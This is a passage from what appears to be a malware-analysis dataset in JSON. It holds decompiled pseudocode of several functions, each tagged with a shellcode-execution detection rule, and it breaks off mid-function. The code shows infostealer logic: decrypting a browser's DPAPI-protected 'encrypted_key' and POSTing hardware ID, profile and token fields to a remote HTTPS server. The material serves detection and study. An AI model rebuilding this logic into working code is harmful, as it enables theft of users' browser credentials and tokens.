        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004100c0(int32_t param_1, uint param_2, uint param_3, uint32_t param_4, uint param_5, uint param_6)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t *arg_ch;\n    uint *puVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char *pcVar8;\n    uint32_t unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint32_t in_stack_0000002c;\n    int32_t iVar9;\n    uchar *puStack672;\n    ulong uStack668;\n    uchar *puStack660;\n    uchar *puVar10;\n    uint *puStack652;\n    char *pcStack644;\n    uint *puStack640;\n    uint *puStack636;\n    uchar *puStack616;\n    uchar auStack612 [4];\n    uint uStack608;\n    uint32_t uStack604;\n    uint uStack600;\n    uint32_t uStack596;\n    uint32_t uStack588;\n    uint uStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t auStack560 [2];\n    uint uStack552;\n    uint32_t uStack548;\n    uint32_t uStack544;\n    uint32_t uStack540;\n    uchar auStack536 [4];\n    uint32_t uStack532;\n    uchar uStack528;\n    uint32_t uStack520;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uchar auStack496 [4];\n    uint32_t uStack492;\n    uint32_t uStack484;\n    uint auStack476 [2];\n    uint uStack468;\n    uint32_t uStack464;\n    uint32_t uStack456;\n    uchar auStack452 [4];\n    uint32_t uStack448;\n    uint32_t uStack440;\n    uint32_t uStack436;\n    uint uStack432;\n    uint32_t uStack428;\n    uint uStack424;\n    uint32_t uStack420;\n    uint uStack416;\n    uchar auStack412 [8];\n    uchar auStack404 [8];\n    uchar auStack396 [4];\n    uint32_t uStack392;\n    uchar auStack388 [4];\n    uchar auStack384 [4];\n    uchar auStack380 [4];\n    uint uStack376;\n    uint32_t uStack372;\n    uint32_t uStack364;\n    uchar auStack356 [8];\n    uint uStack348;\n    uint32_t uStack344;\n    uchar auStack316 [136];\n    uchar uStack180;\n    uchar *puStack116;\n    uint32_t uStack96;\n    uchar uStack84;\n    uchar uStack80;\n    uchar uStack72;\n    uchar uStack64;\n    uchar auStack60 [4];\n    uchar uStack56;\n    int32_t iStack52;\n    uchar uStack44;\n    uchar uStack36;\n    uint32_t uStack32;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack8 = 0x43b209;\n    uStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &stack0xfffffd98;\n    puStack636 = *0x44d6a0 ^ &stack0xfffffd88;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack508 = 0xf;\n    uStack512 = 0;\n    uStack528 = 0;\n    uStack4 = 3;\n    if (param_1 == 0) {\n        puStack640 = 0x1a;\n        pcStack644 = fcn.0041d230();\n        pcVar8 = pcStack644;\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        puStack640 = 0x1c;\n        pcStack644 = fcn.0041d230();\n        pcVar8 = pcStack644;\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n    }\n    puStack640 = pcVar8 + -(pcStack644 + 1);\n    fcn.004052f0();\n    puStack652 = &stack0xfffffde8;\n    puVar10 = &stack0xfffffe58;\n    puStack660 = 0x410186;\n    uVar3 = fcn.0040d260();\n    puStack616 = &stack0xfffffd60;\n    uStack12 = CONCAT31(uStack12._1_3_, 4);\n    fcn.00410040(&stack0xfffffd60, uVar3, &stack0x00000038);\n    fcn.00421250(&stack0xfffffda0);\n    uStack44 = 6;\n    if (0xf < uStack436) {\n        fcn.00427a17(uStack456);\n    }\n    uStack436 = 0xf;\n    uStack440 = 0;\n    uStack456 = uStack456 & 0xffffff00;\n    puStack652 = puStack640;\n    if (puStack640 != puStack636) {\n        do {\n            iVar9 = 0;\n            uStack464 = 7;\n            uStack468 = 0;\n            uStack484 = uStack484 & 0xffff0000;\n            fcn.0040fed0(puStack652, 0, 0xffffffff);\n            uStack56 = 7;\n            uVar3 = fcn.00420580(&stack0xfffffe80, &stack0xfffffe10);\n            uStack64 = 8;\n            uVar4 = fcn.0040d260(&stack0xfffffe40, &stack0xfffffdb4, &stack0xffffffcc);\n            uStack64 = 9;\n            arg_ch = fcn.00405510(&stack0xfffffe94, uVar4, uVar3);\n            uVar2 = auStack560[0];\n            uStack540 = 0xf;\n            uStack544 = 0;\n            auStack560[0] = auStack560[0] & 0xffffff00;\n            if (&stack0xfffffdd0 != arg_ch) {\n                uStack540 = 0xf;\n                uStack544 = 0;\n                auStack560[0] = uVar2 & 0xffffff00;\n                if (arg_ch[5] < 0x10) {\n                    fcn.00427a30(&stack0xfffffdd0, arg_ch, arg_ch[4] + 1);\n                }\n                else {\n                    auStack560[0] = *arg_ch;\n                    *arg_ch = 0;\n                }\n                uStack544 = arg_ch[4];\n                uStack540 = arg_ch[5];\n                arg_ch[4] = 0;\n                arg_ch[5] = 0;\n            }\n            if (0xf < uStack344) {\n                fcn.00427a17(uStack364);\n            }\n            uStack344 = 0xf;\n            uStack348 = 0;\n            uStack364 = uStack364 & 0xffffff00;\n            if (0xf < uStack428) {\n                fcn.00427a17(uStack448);\n            }\n            uStack428 = 0xf;\n            uStack432 = 0;\n            uStack448 = uStack448 & 0xffffff00;\n            uStack64 = 0xe;\n            if (0xf < uStack372) {\n                fcn.00427a17(uStack392);\n            }\n            uStack372 = 0xf;\n            uStack376 = 0;\n            uStack392 = uStack392 & 0xffffff00;\n            uVar3 = fcn.00420580(&stack0xfffffdec, &stack0xfffffe08);\n            uStack72 = 0xf;\n            uVar4 = fcn.0040d260(&stack0xfffffd74, &stack0xfffffdac, &stack0xffffffc4);\n            uStack72 = 0x10;\n            uVar3 = fcn.00405510(&stack0xfffffd90, uVar4, uVar3);\n            uStack72 = 0x11;\n            puVar5 = fcn.00420620(&stack0xfffffe54, uVar3);\n            uStack80 = 0x12;\n            if (7 < puVar5[5]) {\n                puVar5 = *puVar5;\n            }\n            iVar6 = fcn.0041d170(puVar5);\n            if (7 < uStack420) {\n                fcn.00427a17(uStack440);\n            }\n            uStack420 = 7;\n            uStack424 = 0;\n            uStack440 = uStack440 & 0xffff0000;\n            if (0xf < puStack616) {\n                fcn.00427a17(puStack636);\n            }\n            uStack668._4_4_ = uStack668 >> 0x20;\n            puStack616 = 0xf;\n            puStack636 = puStack636 & 0xffffff00;\n            if (0xf < pcStack644) {\n                fcn.00427a17(uStack668._4_4_);\n            }\n            uStack668._4_4_ = uStack668 >> 0x20;\n            uStack668._4_4_ = uStack668._4_4_ & 0xffffff00;\n            uStack84 = 0xe;\n            if (0xf < uStack532) {\n                fcn.00427a17(uStack552);\n            }\n            if (iVar6 != 0) {\n                *(iVar9 + 0x1c) = *(iVar9 + 0x1c) + 1;\n            }\n            fcn.00427390(&stack0xfffffe9c, 0, 0x104);\n            (**0x45ff98)(&stack0xfffffe9c, 0x4451a0);\n            (**0x45ff98)(&stack0xfffffe94, 0x4451a4);\n            (**0x45ff98)(&stack0xfffffe8c, 0x4451a8);\n            (**0x45ff98)(&stack0xfffffe84, 0x4451ac);\n            (**0x45ff98)(&stack0xfffffe7c, 0x4451b0);\n            (**0x45ff98)(&stack0xfffffe74, 0x4451b4);\n            (**0x45ff98)(&stack0xfffffe6c, 0x4451b8);\n            (**0x45ff98)(&stack0xfffffe64, 0x4451bc);\n            (**0x45ff98)(&stack0xfffffe5c, 0x4451c0);\n            puVar10 = puStack116;\n            if (uStack96 < 0x10) {\n                puVar10 = &stack0xffffff8c;\n            }\n            (**0x45ff98)(&stack0xfffffe54, puVar10);\n            (**0x45ff98)(&stack0xfffffe4c, 0x4451c4);\n            puVar5 = fcn.00420580(&stack0xfffffd80, &stack0xfffffd9c);\n            uStack180 = 0x13;\n            if (0xf < puVar5[5]) {\n                puVar5 = *puVar5;\n            }\n            (**0x45ff98)(&stack0xfffffe3c, puVar5);\n            uStack8 = CONCAT31(uStack8._1_3_, 0xe);\n            if (0xf < uStack456) {\n                fcn.00427a17();\n            }\n            pcStack644 = &stack0xfffffe40;\n            puVar5 = &stack0xfffffe24;\n            puStack652 = 0x410644;\n            uVar3 = fcn.00420580();\n            puStack652 = &stack0xfffffffc;\n            puStack660 = &stack0xfffffdc8;\n            uStack16._0_1_ = 0x14;\n            uStack668._4_4_ = 0x410665;\n            uStack668._0_4_ = fcn.0040d260();\n            puStack672 = &stack0xfffffdac;\n            uStack16._0_1_ = 0x15;\n            uStack668._4_4_ = uVar3;\n            puStack652 = fcn.00405510();\n            uStack16 = CONCAT31(uStack16._1_3_, 0x16);\n            if (0xf < puStack652[5]) {\n                puStack652 = *puStack652;\n            }\n            uStack668 = fcn.0041d1d0();\n            puVar10 = NULL;\n            puStack660 = 0x3e8;\n            puStack672 = 0x4106a2;\n            uVar3 = fcn.004288e0();\n            if (0xf < uStack596) {\n                puStack672 = puStack616;\n                fcn.00427a17();\n            }\n            uStack596 = 0xf;\n            uStack600 = 0;\n            puStack616 = puStack616 & 0xffffff00;\n            if (0xf < uStack568) {\n                puStack672 = uStack588;\n                fcn.00427a17();\n            }\n            uStack568 = 0xf;\n            uStack572 = 0;\n            uStack588 = uStack588 & 0xffffff00;\n            uStack36 = 0xe;\n            if (0xf < uStack484) {\n                puStack672 = uStack504;\n                fcn.00427a17();\n            }\n            puStack672 = uVar3;\n            fcn.0040a6b0();\n            puStack672 = &stack0xfffffe24;\n            uVar3 = fcn.00420580(&stack0xfffffe08);\n            uStack44 = 0x17;\n            uVar4 = fcn.0040d260(&stack0xfffffdac, &stack0xfffffdc8, &stack0xffffffe0);\n            uStack44 = 0x18;\n            puVar7 = fcn.00405510(&stack0xfffffd90, uVar4, uVar3);\n            uStack44 = 0x19;\n            if (0xf < puVar7[5]) {\n                puVar7 = *puVar7;\n            }\n            fcn.004266f0(uStack416, &stack0xfffffec4, puVar7);\n            if (0xf < uStack604) {\n                fcn.00427a17(unaff_EBP);\n            }\n            uStack604 = 0xf;\n            uStack608 = 0;\n            unaff_EBP = unaff_EBP & 0xffffff00;\n            if (0xf < uStack576) {\n                fcn.00427a17(uStack596);\n            }\n            uStack576 = 0xf;\n            uStack580 = 0;\n            uStack596 = uStack596 & 0xffffff00;\n            if (0xf < uStack492) {\n                fcn.00427a17(uStack512);\n            }\n            if (0xf < uStack520) {\n                fcn.00427a17(uStack540);\n            }\n            uStack44 = 6;\n            if (7 < uStack464) {\n                fcn.00427a17(uStack484);\n            }\n            puStack652 = puStack652 + 7;\n        } while (puStack652 != puVar5);\n    }\n    puVar7 = puStack636;\n    puVar5 = puStack640;\n    if (puStack640 != NULL) {\n        for (; puVar5 != puVar7; puVar5 = puVar5 + 7) {\n            if (7 < puVar5[5]) {\n                fcn.00427a17(*puVar5);\n            }\n            puVar5[5] = 7;\n            puVar5[4] = 0;\n            *puVar5 = 0;\n        }\n        fcn.00427a17(puStack640);\n    }\n    puStack640 = NULL;\n    puStack636 = NULL;\n    if (0xf < uStack548) {\n        fcn.00427a17(uStack568);\n    }\n    uStack548 = 0xf;\n    uStack552 = 0;\n    uStack568 = uStack568 & 0xffffff00;\n    if (0xf < uStack12) {\n        fcn.00427a17(uStack32);\n    }\n    uStack12 = 0xf;\n    uStack16 = 0;\n    uStack32 = uStack32 & 0xffffff00;\n    if (0xf < param_4) {\n        fcn.00427a17(uStack4);\n    }\n    uStack4 = uStack4 & 0xffffff00;\n    if (0xf < in_stack_0000002c) {\n        fcn.00427a17(param_6);\n    }\n    *in_FS_OFFSET = iStack52;\n    puStack660 = 0x410945;\n    fcn.00427841(puVar10);\n    return;\n}\n",
        "token_count": 3860
    },
    "00411e50": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00411e50(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n                 uint param_8, uint param_9, uint param_10, uint param_11)\n\n{\n    char *arg_10h;\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint arg_10h_00;\n    int32_t iVar4;\n    uint in_stack_000021cc;\n    int32_t in_stack_0000228c;\n    uchar *puStack344;\n    uchar *puStack340;\n    uchar *puStack336;\n    uint uStack332;\n    uchar *puStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uchar *puStack316;\n    uchar *puStack312;\n    uint uStack308;\n    uchar *puStack304;\n    char *pcStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uchar *puStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uchar *puStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uchar *puStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uchar *puStack252;\n    uchar *puStack248;\n    uint uStack244;\n    uchar *puStack240;\n    char *pcStack236;\n    uchar *puStack232;\n    uchar *puStack228;\n    char *pcStack224;\n    uint uStack220;\n    uchar *puStack216;\n    uchar *puStack212;\n    uchar *puStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uchar *puStack196;\n    uchar *puStack192;\n    char *pcStack188;\n    char *pcStack184;\n    uchar *puStack180;\n    char *pcStack176;\n    char *pcStack172;\n    char *pcStack168;\n    uchar *puStack164;\n    char *pcStack160;\n    uchar *puStack156;\n    char *pcStack152;\n    uchar *puStack148;\n    char *pcStack144;\n    uchar *puStack140;\n    char *pcStack136;\n    uchar *puStack132;\n    char *pcStack128;\n    char *pcStack124;\n    uchar *puStack120;\n    char *pcStack116;\n    uchar *puStack112;\n    char *pcStack108;\n    uchar *puStack104;\n    char *pcStack100;\n    uchar *puStack96;\n    char *pcStack92;\n    uchar *puStack88;\n    uchar *puStack84;\n    char *pcStack80;\n    uchar *puStack76;\n    uint uStack72;\n    char *arg_8h;\n    uchar *puStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uchar *puStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    fcn.00428720();\n    uStack20 = 5000;\n    puStack28 = &stack0x00000ee8;\n    uStack24 = 0;\n    uStack32 = 0x411edb;\n    fcn.00427390();\n    uStack32 = 500;\n    puStack40 = &stack0x00000424;\n    puStack36 = NULL;\n    uStack44 = 0x411eef;\n    fcn.00427390();\n    uStack44 = 0x200;\n    puStack52 = &stack0x00000030;\n    puStack48 = NULL;\n    puStack56 = 0x411f00;\n    fcn.00427390();\n    uStack20 = 0x800000;\n    uStack24 = 0;\n    puStack28 = 0x411f10;\n    puStack28 = (**0x45fff4)();\n    uStack32 = 0x411f17;\n    arg_10h = (**0x45ff7c)();\n    uStack32 = 500;\n    puStack40 = &stack0x00000224;\n    puStack36 = NULL;\n    uStack44 = 0x411f2d;\n    fcn.00427390();\n    uStack32 = 0;\n    puStack36 = NULL;\n    puStack40 = NULL;\n    uStack44 = 1;\n    puStack48 = NULL;\n    puStack52 = 0x411f40;\n    puVar1 = (**0x45fed4)();\n    puStack52 = 0x4;\n    puStack56 = &stack0x00000004;\n    uStack60 = 2;\n    param_1 = 120000;\n    puStack64 = puVar1;\n    (**0x45fdc8)();\n    arg_8h = \"https://\";\n    uStack20 = 0x100;\n    puStack48 = NULL;\n    puStack76 = 0x411f7a;\n    iVar2 = (**0x45ffc8)();\n    if (iVar2 == 0) {\n        puStack56 = 0x1;\n    }\n    puVar3 = puStack52;\n    if (puVar1 != NULL) {\n        puStack76 = 0x10;\n        pcStack80 = 0x411f99;\n        pcStack80 = fcn.0041d100();\n        puStack84 = &stack0x000003e8;\n        puStack88 = 0x411fa8;\n        (**0x45ff98)();\n        puStack88 = 0x4453f8;\n        puStack96 = 0x411fb4;\n        pcStack92 = arg_10h;\n        (**0x45ff98)();\n        puStack96 = 0x4453fc;\n        puStack104 = 0x411fc0;\n        pcStack100 = arg_10h;\n        (**0x45ff98)();\n        puStack104 = &stack0x000003d0;\n        puStack112 = 0x411fcf;\n        pcStack108 = arg_10h;\n        (**0x45ff98)();\n        puStack112 = 0x445404;\n        puStack120 = 0x411fdb;\n        pcStack116 = arg_10h;\n        (**0x45ff98)();\n        puStack120 = 0x445408;\n        pcStack128 = 0x411fe7;\n        pcStack124 = arg_10h;\n        (**0x45ff98)();\n        pcStack128 = \"Cont\";\n        puStack132 = &stack0x000001c4;\n        pcStack136 = 0x411ffa;\n        (**0x45ff98)();\n        pcStack136 = \"ent-Typ\";\n        puStack140 = &stack0x000001bc;\n        pcStack144 = 0x41200d;\n        (**0x45ff98)();\n        pcStack144 = \"e: multip\";\n        puStack148 = &stack0x000001b4;\n        pcStack152 = 0x412020;\n        (**0x45ff98)();\n        pcStack152 = \"art/for\";\n        puStack156 = &stack0x000001ac;\n        pcStack160 = 0x412033;\n        (**0x45ff98)();\n        pcStack160 = \"m-data; \";\n        puStack164 = &stack0x000001a4;\n        pcStack168 = 0x412046;\n        (**0x45ff98)();\n        pcStack168 = \"boun\";\n        pcStack172 = &stack0x0000019c;\n        pcStack176 = 0x412059;\n        (**0x45ff98)();\n        pcStack176 = \"dary=\";\n        puStack180 = &stack0x00000194;\n        pcStack184 = 0x41206c;\n        (**0x45ff98)();\n        pcStack184 = \"----\";\n        pcStack188 = &stack0x0000018c;\n        puStack192 = 0x41207f;\n        (**0x45ff98)();\n        puStack192 = &stack0x00000378;\n        puStack196 = &stack0x00000184;\n        puStack200 = 0x412095;\n        (**0x45ff98)();\n        puStack200 = NULL;\n        uStack204 = 0;\n        puStack208 = 0x3;\n        puStack212 = NULL;\n        puStack216 = NULL;\n        puStack228 = puVar1;\n        uStack220 = in_stack_000021cc;\n        if (puStack180 == NULL) {\n            pcStack224 = pcStack176;\n            puStack232 = 0x4120d6;\n            puVar3 = (**0x45fff0)();\n        }\n        else {\n            pcStack224 = pcStack176;\n            puStack232 = 0x4120ba;\n            puVar3 = (**0x45fff0)();\n        }\n        puStack52 = puVar3;\n        if (puVar3 != NULL) {\n            puStack76 = NULL;\n            if (puStack56 == NULL) {\n                pcStack80 = 0x400100;\n                pcStack92 = \"HTTP/1.1\";\n                pcStack100 = \"POST\";\n            }\n            else {\n                pcStack80 = 0xc00100;\n                pcStack92 = 0x445454;\n                pcStack100 = 0x445460;\n            }\n            puStack84 = NULL;\n            puStack88 = NULL;\n            puStack96 = puStack48;\n            pcStack108 = 0x412126;\n            puStack104 = puVar3;\n            puStack56 = (**0x460034)();\n            if (puStack56 != NULL) {\n                puStack76 = 0x44547c;\n                pcStack80 = &stack0xfffffff8;\n                puStack84 = 0x412142;\n                (**0x45ff98)();\n                puStack84 = &stack0x000003e4;\n                puStack88 = &stack0xfffffff0;\n                pcStack92 = 0x412155;\n                (**0x45ff98)();\n                pcStack92 = 0x445484;\n                puStack96 = &stack0xffffffe8;\n                pcStack100 = 0x412165;\n                (**0x45ff98)();\n                pcStack100 = 0x445488;\n                puStack104 = &stack0xffffffe0;\n                pcStack108 = 0x412175;\n                (**0x45ff98)();\n                pcStack108 = \"profile\";\n                puStack112 = &stack0xffffffd8;\n                pcStack116 = 0x412185;\n                (**0x45ff98)();\n                pcStack116 = 0x4454b8;\n                puStack120 = &stack0xffffffd0;\n                pcStack124 = 0x412195;\n                (**0x45ff98)();\n                pcStack124 = pcStack80;\n                pcStack128 = &stack0xffffffc8;\n                puStack132 = 0x4121a5;\n                (**0x45ff98)();\n                puStack132 = 0x4454c0;\n                pcStack136 = &stack0xffffffc0;\n                puStack140 = 0x4121b5;\n                (**0x45ff98)();\n                puStack140 = 0x4454c4;\n                pcStack144 = &stack0xffffffb8;\n                puStack148 = 0x4121c5;\n                (**0x45ff98)();\n                puStack148 = &stack0x000003a4;\n                pcStack152 = &stack0xffffffb0;\n                puStack156 = 0x4121d8;\n                (**0x45ff98)();\n                puStack156 = 0x4454cc;\n                pcStack160 = &stack0xffffffa8;\n                puStack164 = 0x4121e8;\n                (**0x45ff98)();\n                puStack164 = 0x4454d0;\n                pcStack168 = &stack0xffffffa0;\n                pcStack172 = 0x4121f8;\n                (**0x45ff98)();\n                pcStack172 = \"profile_id\";\n                pcStack176 = &stack0xffffff98;\n                puStack180 = 0x412208;\n                (**0x45ff98)();\n                puStack180 = 0x445504;\n                pcStack184 = &stack0xffffff90;\n                pcStack188 = 0x412218;\n                (**0x45ff98)();\n                pcStack188 = pcStack136;\n                puStack192 = &stack0xffffff88;\n                puStack196 = 0x412228;\n                (**0x45ff98)();\n                puStack196 = 0x44550c;\n                puStack200 = &stack0xffffff80;\n                uStack204 = 0x412238;\n                (**0x45ff98)();\n                uStack204 = 0x445510;\n                puStack208 = &stack0xffffff78;\n                puStack212 = 0x412248;\n                (**0x45ff98)();\n                puStack212 = &stack0x00000364;\n                puStack216 = &stack0xffffff70;\n                uStack220 = 0x41225b;\n                (**0x45ff98)();\n                uStack220 = 0x445518;\n                pcStack224 = &stack0xffffff68;\n                puStack228 = 0x41226b;\n                (**0x45ff98)();\n                puStack228 = 0x44551c;\n                puStack232 = &stack0xffffff60;\n                pcStack236 = 0x41227b;\n                (**0x45ff98)();\n                pcStack236 = \"hwid\";\n                puStack240 = &stack0xffffff58;\n                uStack244 = 0x41228b;\n                (**0x45ff98)();\n                uStack244 = 0x44554c;\n                puStack248 = &stack0xffffff50;\n                puStack252 = 0x41229b;\n                (**0x45ff98)();\n                puStack252 = puStack192;\n                puStack256 = &stack0xffffff48;\n                uStack260 = 0x4122ab;\n                (**0x45ff98)();\n                uStack260 = 0x445554;\n                puStack264 = &stack0xffffff40;\n                uStack268 = 0x4122bb;\n                (**0x45ff98)();\n                uStack268 = 0x445558;\n                puStack272 = &stack0xffffff38;\n                puStack276 = 0x4122cb;\n                (**0x45ff98)();\n                puStack276 = &stack0x00000324;\n                puStack280 = &stack0xffffff30;\n                uStack284 = 0x4122de;\n                (**0x45ff98)();\n                uStack284 = 0x445560;\n                puStack288 = &stack0xffffff28;\n                uStack292 = 0x4122ee;\n                (**0x45ff98)();\n                uStack292 = 0x445564;\n                puStack296 = &stack0xffffff20;\n                pcStack300 = 0x4122fe;\n                (**0x45ff98)();\n                pcStack300 = \"token\";\n                puStack304 = &stack0xffffff18;\n                uStack308 = 0x41230e;\n                (**0x45ff98)();\n                uStack308 = 0x445594;\n                puStack312 = &stack0xffffff10;\n                puStack316 = 0x41231e;\n                (**0x45ff98)();\n                puStack316 = puStack280;\n                puStack320 = &stack0xffffff08;\n                uStack324 = 0x41232e;\n                (**0x45ff98)();\n                uStack324 = 0x44559c;\n                puStack328 = &stack0xffffff00;\n                uStack332 = 0x41233e;\n                (**0x45ff98)();\n                uStack332 = 0x4455a0;\n                puStack336 = &stack0xfffffef8;\n                puStack340 = 0x41234e;\n                (**0x45ff98)();\n                puStack340 = &stack0x000002e4;\n                puStack344 = &stack0xfffffef0;\n                (**0x45ff98)();\n                (**0x45ff98)();\n                (**0x45ff98)();\n                (**0x45ff98)();\n                (**0x45ff98)();\n                (**0x45fe90)();\n                (**0x45fe90)();\n                (**0x45fff4)();\n                iVar2 = (**0x45ff7c)();\n                arg_10h_00 = (**0x45fe90)();\n                fcn.004274e0(iVar2, &stack0xfffffeb0, arg_10h_00);\n                puVar1 = &stack0xfffffeb0;\n                puVar3 = puStack340;\n                iVar4 = (**0x45fe90)();\n                fcn.004274e0(iVar4 + iVar2, puVar1, puVar3);\n                (**0x45fe90)();\n                puVar1 = &stack0xfffffea8;\n                iVar4 = (**0x45fe90)();\n                fcn.004274e0(iVar4 + in_stack_0000228c + iVar2, puVar1, arg_10h);\n                iVar2 = 0;\n                do {\n                    (**0x45fe90)();\n                    (**0x45ffb4)();\n                    iVar4 = (**0x46004c)();\n                    if ((iVar4 != 0) && (iVar4 = (**0x45ffc8)(),  iVar4 == 0)) break;\n                    (**0x45fe08)();\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < 6);\n                iVar2 = (**0x45fef8)();\n                puVar3 = puStack52;\n                puVar1 = puStack36;\n                while ((puStack52 = puVar3,  puStack36 = puVar1,  iVar2 != 0 && (puStack48 != NULL))) {\n                    (&stack0x000006e0)[puStack48] = 0;\n                    puStack76 = &stack0x000006e0;\n                    pcStack80 = &stack0x00000eb0;\n                    puStack84 = 0x4124ce;\n                    (**0x45ff98)();\n                    puStack84 = &stack0xffffffc8;\n                    puStack88 = 0x7cf;\n                    pcStack92 = &stack0x000006d8;\n                    puStack96 = puStack64;\n                    pcStack100 = 0x4124eb;\n                    iVar2 = (**0x45fef8)();\n                    puVar3 = puStack52;\n                    puVar1 = puStack36;\n                }\n            }\n        }\n    }\n    puStack76 = puStack56;\n    pcStack80 = 0x412502;\n    (**0x45fed0)();\n    puStack84 = 0x412509;\n    pcStack80 = puVar3;\n    (**0x45fed0)();\n    puStack88 = 0x412510;\n    puStack84 = puVar1;\n    (**0x45fed0)();\n    uStack72 = 0x412529;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 4249
    },
    "null": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00416ec0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00416ec0(uint param_1, uint param_2, uint param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint ***pppuVar5;\n    char *pcVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *in_stack_ffffffc4;\n    uint uStack56;\n    uint32_t uStack52;\n    uint uStack48;\n    uint ***apppuStack44 [4];\n    uint uStack28;\n    uint32_t uStack24;\n    uint32_t uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b658;\n    piStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &stack0xffffffc4;\n    uVar2 = *0x44d6a0 ^ &stack0xffffffb8;\n    *in_FS_OFFSET = &piStack12;\n    uStack48 = param_3;\n    iVar3 = fcn.004128e0(param_1, &stack0xffffffc4, &uStack56, uVar2);\n    if (iVar3 != 0) {\n        iVar3 = fcn.0041d0c0(in_stack_ffffffc4, uStack56);\n        if (iVar3 != 0) {\n            iVar3 = (**0x45fe18)(iVar3, \"encrypted_key\");\n            if (iVar3 != 0) {\n                uStack24 = 0xf;\n                uStack28 = 0;\n                apppuStack44[0] = apppuStack44[0] & 0xffffff00;\n                pcVar6 = iVar3 + 0x10;\n                do {\n                    cVar1 = *pcVar6;\n                    pcVar6 = pcVar6 + 1;\n                } while (cVar1 != '\\0');\n                fcn.004052f0(iVar3 + 0x10, pcVar6 - (iVar3 + 0x11));\n                iVar3 = 0x445650;\n                piStack12 = NULL;\n                iVar4 = fcn.0040a780();\n                if (iVar4 != -1) {\n                    fcn.00404b40();\n                    iVar3 = iVar4;\n                }\n                pppuVar5 = apppuStack44[0];\n                if (uStack24 < 0x10) {\n                    pppuVar5 = apppuStack44;\n                }\n                iVar3 = fcn.00412980(pppuVar5, &stack0xffffffc4, &uStack52, iVar3);\n                if ((((iVar3 != 0) && (4 < uStack52)) && (*in_stack_ffffffc4 == str.DPAPI._0_4_)) &&\n                   (*(in_stack_ffffffc4 + 1) == 'I')) {\n                    cVar1 = fcn.004129f0(in_stack_ffffffc4 + 5, uStack52 - 5, &uStack56, &stack0xffffffc4);\n                    if ((cVar1 != '\\0') && (in_stack_ffffffc4 == 0x20)) {\n                        fcn.00412ac0(uStack56, param_2, uStack48);\n                    }\n                }\n                if (0xf < uStack24) {\n                    fcn.00427a17(apppuStack44[0]);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piStack12;\n    fcn.00427841(in_stack_ffffffc4);\n    return;\n}\n",
        "token_count": 813
    },
    "00418850": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418850(uchar *param_1, uint32_t param_2, uint param_3, uint param_4)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *arg_10h;\n    char *pcVar9;\n    char *unaff_EBX;\n    uint unaff_EBP;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_ch;\n    uint uVar10;\n    uint uStack200;\n    uchar *arg_8h;\n    uchar *puStack192;\n    uint32_t uStack188;\n    uint uStack168;\n    uint uStack164;\n    uchar *puStack160;\n    uint32_t uStack156;\n    uint uStack144;\n    uint32_t uStack140;\n    uint32_t uStack136;\n    uint uStack132;\n    uint32_t uStack128;\n    uchar auStack124 [4];\n    uchar auStack120 [4];\n    uint32_t uStack116;\n    uint32_t uStack112;\n    uint32_t uStack108;\n    uchar uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    uint uStack80;\n    uchar auStack76 [4];\n    uint uStack72;\n    uint uStack68;\n    uchar uStack64;\n    uchar uStack48;\n    uchar uStack44;\n    uint uStack40;\n    uchar uStack32;\n    uint32_t uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43b7f8;\n    iStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ 